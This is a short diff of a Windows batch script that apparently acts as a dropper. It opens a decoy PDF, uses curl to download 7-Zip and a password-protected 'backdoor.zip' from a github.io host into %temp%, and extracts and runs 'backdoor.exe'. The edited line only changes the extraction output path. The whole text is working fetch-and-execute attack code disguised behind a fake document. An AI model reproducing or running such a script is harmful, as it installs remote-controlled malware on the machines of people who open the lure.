@@ -10,5 +10,5 @@ rundll32 url.dll,FileProtocolHandler file:///%temp%/pdf-test.pdf
 curl https://sheng855174.github.io/7z.exe -o "%temp%\7z.exe"
 curl https://sheng855174.github.io/7z.dll -o "%temp%\7z.dll"
 curl https://sheng855174.github.io/backdoor.zip -o "%temp%\backdoor.zip"
-%temp%\7z.exe x %temp%\backdoor.zip -p12345678
+%temp%\7z.exe x %temp%\backdoor.zip -p12345678 -o %temp%\backdoor.exe
 %temp%\backdoor.exe
